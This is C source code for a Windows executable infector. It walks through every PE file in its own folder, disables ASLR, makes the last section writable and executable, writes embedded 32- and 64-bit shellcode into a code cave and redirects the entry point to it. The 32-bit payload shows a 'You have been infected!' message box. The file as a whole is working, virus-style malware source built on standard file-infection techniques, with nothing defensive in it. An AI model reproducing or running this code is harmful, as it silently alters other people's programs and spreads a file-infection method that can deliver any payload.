#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define PREFIX_NOP_COUNT   4

// 32-bit MessageBox shellcode 
#define BASE_SHELL32_SIZE  267
static const unsigned char BaseShell32[BASE_SHELL32_SIZE] = {
    0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,
    0x8b,0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,
    0x20,0x8b,0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,
    0x8b,0x6c,0x24,0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,
    0x4a,0x18,0x8b,0x5a,0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,
    0xee,0x31,0xff,0x31,0xc0,0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,
    0x01,0xc7,0xeb,0xf4,0x3b,0x7c,0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,
    0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,
    0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,0x08,0x29,0xd4,0x89,0xe5,0x89,
    0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,0xff,0xff,0xff,0x89,0x45,
    0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,0xe8,0x8e,0xff,0xff,
    0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,0x32,0x2e,0x64,
    0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe6,0x56,
    0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,0x24,
    0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x74,0x58,0x20,0x20,0x68,0x41,0x6c,
    0x65,0x72,0x31,0xdb,0x88,0x5c,0x24,0x05,0x89,0xe3,0x68,0x65,0x64,0x21,
    0x58,0x68,0x66,0x65,0x63,0x74,0x68,0x6e,0x20,0x69,0x6e,0x68,0x20,0x62,
    0x65,0x65,0x68,0x68,0x61,0x76,0x65,0x68,0x59,0x6f,0x75,0x20,0x31,0xc9,
    0x88,0x4c,0x24,0x17,0x89,0xe1,0x31,0xd2,0x6a,0x10,0x53,0x51,0x52,0xff,
    0xd0
};

// 64-bit MessageBox shellcode
#define BASE_SHELL64_SIZE   361
static const unsigned char BaseShell64[BASE_SHELL64_SIZE] = {
    0x48,0x31,0xc9,0x48,0x81,0xe9,0xd7,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,
    0xff,0x48,0xbb,0xc8,0x99,0xa0,0x46,0xce,0x58,0x96,0x72,0x48,0x31,0x58,0x27,0x48,
    0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x34,0xd1,0x21,0xa2,0x3e,0xa7,0x69,0x8d,0x20,
    0x49,0xa0,0x46,0xce,0x19,0xc7,0x33,0x98,0xcb,0xf1,0x10,0x86,0x69,0x44,0x17,0x80,
    0x12,0xf2,0x26,0xf0,0x10,0x1d,0x20,0xd0,0xa7,0xe8,0xcd,0x9c,0x78,0xa8,0x3a,0x43,
    0xeb,0xf0,0x78,0x86,0x57,0x21,0x38,0x82,0xd4,0x91,0x8f,0x86,0x69,0x56,0xde,0xf4,
    0xf8,0xdc,0x44,0xe2,0x78,0xd7,0xb3,0x01,0x94,0xe1,0x47,0x0f,0xba,0x7b,0x20,0x89,
    0xc8,0x9e,0x0e,0x45,0x0a,0xb6,0x4c,0x43,0xdb,0x9c,0x0e,0xcf,0x88,0xa8,0xf9,0x48,
    0x11,0xa0,0x46,0xce,0x10,0x13,0xb2,0xbc,0xf6,0xe8,0x47,0x1e,0x08,0xa8,0xf9,0x80,
    0x81,0x9e,0x02,0x45,0x18,0xb6,0x3b,0xc9,0x49,0x43,0x1a,0x86,0xa7,0x5f,0x4c,0x89,
    0x12,0x94,0xce,0x86,0x59,0x40,0x3f,0xf9,0x50,0xe8,0x77,0x0e,0xf4,0xd7,0xb3,0x01,
    0x94,0xe1,0x47,0x0f,0x60,0x76,0x07,0x39,0xa7,0xec,0x45,0x82,0x7c,0x9e,0x37,0xf1,
    0x48,0xd5,0x90,0x96,0x66,0xd2,0xf9,0x88,0xbd,0xe9,0x47,0x1e,0x3e,0xa8,0x33,0x43,
    0x95,0xe8,0x78,0x8a,0xd3,0xd6,0x6e,0x81,0x98,0x70,0x78,0x8f,0xd3,0x92,0xfa,0x80,
    0x98,0x70,0x07,0x96,0x19,0xce,0x2c,0x91,0xc3,0xe1,0x1e,0x8f,0x01,0xd7,0x28,0x80,
    0x1a,0x4c,0x66,0x8f,0x0a,0x69,0x92,0x90,0xd8,0xf9,0x1c,0xf0,0x10,0x1d,0x60,0x21,
    0xd0,0x5f,0xb9,0x31,0x05,0xa8,0x3a,0x45,0x14,0x8c,0x47,0xce,0x58,0xd7,0xc8,0x84,
    0xee,0x86,0x41,0x31,0x8d,0xdf,0xb5,0x09,0x89,0xa0,0x46,0xce,0x66,0xde,0xff,0x5d,
    0x97,0xa1,0x46,0xce,0x66,0xda,0xff,0x4d,0xbf,0xa1,0x46,0xce,0x10,0xa7,0xbb,0x89,
    0x23,0xe5,0xc5,0x98,0x5f,0x69,0xa7,0x80,0xa8,0x69,0x07,0x74,0xa8,0x23,0xd0,0x9e,
    0x66,0x75,0x1f,0xa1,0x2d,0xb6,0x1a,0xa9,0xef,0xc5,0x66,0xac,0x3d,0xf3,0x1c,0xe8,
    0xf0,0xce,0x20,0xab,0x3b,0xe2,0x17,0xac,0xb8,0xa0,0x07,0xa2,0x3d,0xe4,0x06,0xc8,
    0xec,0xd3,0x23,0xbc,0x6b,0xa4,0x5c,0xac,0xf5
};


// Search a buffer for a byte pattern (length given). Returns 1 if found.
static int buffer_contains(const unsigned char *buffer, size_t bufSize,
                           const unsigned char *pattern, size_t patSize) {
    if (bufSize < patSize) return 0;
    for (size_t i = 0; i <= bufSize - patSize; i++) {
        if (memcmp(buffer + i, pattern, patSize) == 0) {
            return 1;
        }
    }
    return 0;
}

// --------------------------------------------------------------------------
// injectFile(): Inject into the last section of a PE (32-bit or 64-bit).
// Before injecting, disables ASLR (clears DYNAMIC_BASE) and checks whether
// shellcode signature already exists in the file to avoid double-injection and error.
// Returns 0 = success, 1 = error, 2 = skip (not a valid PE or already injected).
// --------------------------------------------------------------------------
int injectFile(const char *filename) {
    FILE *f = NULL;
    unsigned char *buffer = NULL;
    size_t fileSize = 0;

    // 1. Read entire file into memory
    f = fopen(filename, "rb");
    if (!f) {
        fprintf(stderr, "[%s] Error: Cannot open for reading.\n", filename);
        return 1;
    }
    fseek(f, 0, SEEK_END);
    fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    buffer = (unsigned char *)malloc(fileSize);
    if (!buffer) {
        fclose(f);
        fprintf(stderr, "[%s] Error: Out of memory.\n", filename);
        return 1;
    }
    if (fread(buffer, 1, fileSize, f) != fileSize) {
        fclose(f);
        free(buffer);
        fprintf(stderr, "[%s] Error: Could not read entire file.\n", filename);
        return 1;
    }
    fclose(f);

    // 2. Parse DOS header
    if (fileSize < sizeof(IMAGE_DOS_HEADER)) {
        free(buffer);
        return 2; // not a valid PE
    }
    IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        free(buffer);
        return 2; // not a valid PE
    }

    // 3. Parse NT header
    uint32_t e_lfanew = dosHeader->e_lfanew;
    if ((size_t)e_lfanew + sizeof(uint32_t) > fileSize) {
        free(buffer);
        fprintf(stderr, "[%s] Error: Invalid e_lfanew.\n", filename);
        return 1;
    }
    uint32_t *ntSig = (uint32_t *)(buffer + e_lfanew);
    if (*ntSig != IMAGE_NT_SIGNATURE) {
        free(buffer);
        return 2; // not a valid PE
    }

    // 4. Locate FileHeader + OptionalHeader
    IMAGE_FILE_HEADER      *fileHeader = (IMAGE_FILE_HEADER *)(buffer + e_lfanew + sizeof(uint32_t));
    IMAGE_OPTIONAL_HEADER32 *oh32       = (IMAGE_OPTIONAL_HEADER32 *)(buffer + e_lfanew  
                                              + sizeof(uint32_t) + sizeof(IMAGE_FILE_HEADER));
    IMAGE_OPTIONAL_HEADER64 *oh64       = (IMAGE_OPTIONAL_HEADER64 *)oh32;

    int is32 = 0, is64 = 0;
    if (oh32->Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        is32 = 1;
        printf("[%s] Detected: 32-bit PE\n", filename);
    } else if (oh32->Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        is64 = 1;
        printf("[%s] Detected: 64-bit PE\n", filename);
    } else {
        free(buffer);
        fprintf(stderr, "[%s] Error: Unsupported PE format.\n", filename);
        return 1;
    }

    // 5. Disable ASLR
    if (is32) {
        IMAGE_NT_HEADERS32 *nt32 = (IMAGE_NT_HEADERS32 *)(buffer + e_lfanew);
        nt32->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    } else {
        IMAGE_NT_HEADERS64 *nt64 = (IMAGE_NT_HEADERS64 *)(buffer + e_lfanew);
        nt64->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    }

    // 6. If shellcode signature already present in file, skip injection
    //    Use first 8 bytes of each shellcode as a unique signature
    const unsigned char sig32[8] = {0x90,0x90,0x90,0x90,0x60,0xd9,0xeb,0x9b};
    const unsigned char sig64[8] = {0x90,0x90,0x90,0x90,0x48,0x31,0xc9,0x48};
    if ((is32 && buffer_contains(buffer, fileSize, sig32, 8)) ||
        (is64 && buffer_contains(buffer, fileSize, sig64, 8))) {
        free(buffer);
        printf("[%s] Skipped: Shellcode signature already present.\n", filename);
        return 2;
    }

    // 7. Locate first section header
    IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER *)( 
        (LPBYTE)&oh32[1] + fileHeader->SizeOfOptionalHeader 
        - (is64 ? sizeof(IMAGE_OPTIONAL_HEADER64) : sizeof(IMAGE_OPTIONAL_HEADER32))
    );
    int numSections = fileHeader->NumberOfSections;
    if (numSections == 0) {
        free(buffer);
        fprintf(stderr, "[%s] Error: No sections present.\n", filename);
        return 1;
    }

    // 8. Identify the last section
    IMAGE_SECTION_HEADER *lastSec = &section[numSections - 1];
    uint32_t lastVirtAddr = lastSec->VirtualAddress;
    uint32_t lastVirtSize = lastSec->Misc.VirtualSize;
    uint32_t lastRawPtr   = lastSec->PointerToRawData;
    uint32_t lastRawSize  = lastSec->SizeOfRawData;

    // 9. Read original EntryPoint RVA & ImageBase
    uint32_t origEntryRVA32 = 0;
    uint64_t imageBase = 0;
    if (is32) {
        IMAGE_NT_HEADERS32 *nt32 = (IMAGE_NT_HEADERS32 *)(buffer + e_lfanew);
        origEntryRVA32 = nt32->OptionalHeader.AddressOfEntryPoint;
        imageBase      = nt32->OptionalHeader.ImageBase;
    } else {
        IMAGE_NT_HEADERS64 *nt64 = (IMAGE_NT_HEADERS64 *)(buffer + e_lfanew);
        origEntryRVA32 = nt64->OptionalHeader.AddressOfEntryPoint;
        imageBase      = nt64->OptionalHeader.ImageBase;
    }

    // 10. Compute minimum code cave size within last section
    int baseSize = is32 ? BASE_SHELL32_SIZE : BASE_SHELL64_SIZE;
    int minCave  = PREFIX_NOP_COUNT + 1 + baseSize + 1 + (is32 ? 5 : 12);
    //   32-bit: 4 NOP + PUSHAD + 267 + POPAD + 5-byte JMP = 278
    //   64-bit: 4 NOP + 361 + 10 (mov rax) + 2 (jmp rax) = 377

    // 11. Search for a zero-byte run (“code cave”) inside the last section only
    uint64_t rawOffsetFound = 0, virtAddrFound = 0;
    {
        int count = 0;
        for (uint32_t off = 0; off < lastRawSize; off++) {
            if (buffer[lastRawPtr + off] == 0x00) {
                count++;
            } else {
                if (count >= minCave) {
                    rawOffsetFound = lastRawPtr + off - count;
                    virtAddrFound  = imageBase + lastVirtAddr + (off - count);
                    // Expand the last section’s flags: CODE|EXECUTE|READ|WRITE
                    lastSec->Characteristics =
                          IMAGE_SCN_CNT_CODE
                        | IMAGE_SCN_MEM_EXECUTE
                        | IMAGE_SCN_MEM_READ
                        | IMAGE_SCN_MEM_WRITE;
                    break;
                }
                count = 0;
            }
        }
        if (count >= minCave) {
            // Handle trailing zeros at section’s end
            rawOffsetFound = lastRawPtr + lastRawSize - count;
            virtAddrFound  = imageBase + lastVirtAddr + (lastRawSize - count);
            lastSec->Characteristics =
                  IMAGE_SCN_CNT_CODE
                | IMAGE_SCN_MEM_EXECUTE
                | IMAGE_SCN_MEM_READ
                | IMAGE_SCN_MEM_WRITE;
        }
    }

    if (rawOffsetFound == 0) {
        free(buffer);
        fprintf(stderr, "[%s] Error: No code cave ≥ %d bytes found in last section.\n",
                filename, minCave);
        return 1;
    }

    // 12. Patch EntryPoint to point at the code cave
    uint64_t newEntryVA = virtAddrFound;
    uint32_t newEntryRVA = (uint32_t)(newEntryVA - imageBase);
    if (is32) {
        IMAGE_NT_HEADERS32 *nt32 = (IMAGE_NT_HEADERS32 *)(buffer + e_lfanew);
        nt32->OptionalHeader.AddressOfEntryPoint = newEntryRVA;
    } else {
        IMAGE_NT_HEADERS64 *nt64 = (IMAGE_NT_HEADERS64 *)(buffer + e_lfanew);
        nt64->OptionalHeader.AddressOfEntryPoint = newEntryRVA;
    }

    // 13. Compute the absolute original EntryPoint VA
    uint64_t origEntryVA = imageBase + origEntryRVA32;

    // 14. Build the shellcode blob
    unsigned char *finalShell;
    size_t finalSize;
    if (is32) {
        // [4 NOPs] [PUSHAD] [BaseShell32] [POPAD] [JMP rel32 → origEntry]
        size_t blobSize = PREFIX_NOP_COUNT + 1 + BASE_SHELL32_SIZE + 1 + 5;
        finalShell = (unsigned char *)malloc(blobSize);
        finalSize  = blobSize;
        size_t idx = 0;

        // (1) 4 NOPs
        for (int i = 0; i < PREFIX_NOP_COUNT; i++) {
            finalShell[idx++] = 0x90;
        }
        // (2) PUSHAD
        finalShell[idx++] = 0x60;
        // (3) Copy the 32-bit base shellcode
        memcpy(finalShell + idx, BaseShell32, BASE_SHELL32_SIZE);
        idx += BASE_SHELL32_SIZE;
        // (4) POPAD
        finalShell[idx++] = 0x61;
        // (5) JMP rel32 → original EntryPoint
        //     jmpInstrVA = newEntryVA + idx
        //     next instruction after JMP is (jmpInstrVA + 5)
        uint32_t jmpInstrVA = (uint32_t)(newEntryVA + idx);
        uint32_t rel32_ = (uint32_t)(origEntryVA - ((uint64_t)jmpInstrVA + 5));
        finalShell[idx++] = 0xE9;
        *(uint32_t *)(finalShell + idx) = rel32_;
        idx += 4;
    } else {
        // [4 NOPs] [BaseShell64] [MOV RAX, origEntryVA] [JMP RAX]
        // MOV RAX, imm64 = 0x48 0xB8 <imm64>
        // JMP RAX       = 0xFF 0xE0
        size_t blobSize = PREFIX_NOP_COUNT + BASE_SHELL64_SIZE + 10 + 2;
        finalShell = (unsigned char *)malloc(blobSize);
        finalSize  = blobSize;
        size_t idx = 0;

        // (1) 4 NOPs
        for (int i = 0; i < PREFIX_NOP_COUNT; i++) {
            finalShell[idx++] = 0x90;
        }
        // (2) Copy the 64-bit base shellcode
        memcpy(finalShell + idx, BaseShell64, BASE_SHELL64_SIZE);
        idx += BASE_SHELL64_SIZE;
        // (3) MOV RAX, origEntryVA
        finalShell[idx++] = 0x48;
        finalShell[idx++] = 0xB8;
        *(uint64_t *)(finalShell + idx) = origEntryVA;
        idx += 8;
        // (4) JMP RAX
        finalShell[idx++] = 0xFF;
        finalShell[idx++] = 0xE0;
    }

    // 15. Copy shellcode into the discovered code cave
    if (rawOffsetFound + finalSize > fileSize) {
        free(finalShell);
        free(buffer);
        fprintf(stderr, "[%s] Error: Shellcode does not fit at offset 0x%llX.\n",
                filename, rawOffsetFound);
        return 1;
    }
    memcpy(buffer + rawOffsetFound, finalShell, finalSize);
    free(finalShell);

    // 16. Save the modified PE back to disk
    f = fopen(filename, "r+b");
    if (!f) {
        free(buffer);
        fprintf(stderr, "[%s] Error: Unable to reopen for writing.\n", filename);
        return 1;
    }
    if (fwrite(buffer, 1, fileSize, f) != fileSize) {
        fclose(f);
        free(buffer);
        fprintf(stderr, "[%s] Error: Could not write changes.\n", filename);
        return 1;
    }
    fclose(f);
    free(buffer);

    printf("[OK] Injected \"%s\" → NewEntryRVA=0x%X, CaveOffset=0x%llX, ShellSize=%zu bytes\n",
           filename, newEntryRVA, rawOffsetFound, finalSize);
    return 0;
}

int main(void) {
    CHAR exeFullPath[MAX_PATH];
    CHAR dirPath[MAX_PATH];
    WIN32_FIND_DATAA findData;
    HANDLE hFind;
    char searchPattern[MAX_PATH];
    char candidatePath[MAX_PATH];

    // 1. Get full path of this injector
    if (!GetModuleFileNameA(NULL, exeFullPath, MAX_PATH)) {
        fprintf(stderr, "Error: GetModuleFileNameA failed.\n");
        return 1;
    }

    // 2. Extract directory from exeFullPath
    strcpy_s(dirPath, MAX_PATH, exeFullPath);
    char *lastSlash = strrchr(dirPath, '\\');
    if (!lastSlash) {
        fprintf(stderr, "Error: Cannot parse executable path.\n");
        return 1;
    }
    *lastSlash = '\0';  

    snprintf(searchPattern, MAX_PATH, "%s\\*.*", dirPath);

    hFind = FindFirstFileA(searchPattern, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error: FindFirstFile failed in \"%s\".\n", dirPath);
        return 1;
    }

    do {
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) {
            continue;
        }
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        // Build full path of candidate file
        snprintf(candidatePath, MAX_PATH, "%s\\%s", dirPath, findData.cFileName);

        // Skip injecting into this injector itself
        if (_stricmp(candidatePath, exeFullPath) == 0) {
            continue;
        }

        // Open and read first 2 bytes to see if "MZ"
        FILE *fTest = fopen(candidatePath, "rb");
        if (!fTest) {
            continue;
        }
        unsigned char mz[2];
        if (fread(mz, 1, 2, fTest) != 2) {
            fclose(fTest);
            continue;
        }
        fclose(fTest);
        if (mz[0] != 'M' || mz[1] != 'Z') {
            continue;
        }

        int result = injectFile(candidatePath);
        //   0 → success (messages printed inside injectFile)
        //   2 → skipped (not a valid PE or already injected)
        //   1 → error (messages printed inside injectFile)
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
    return 0;
}
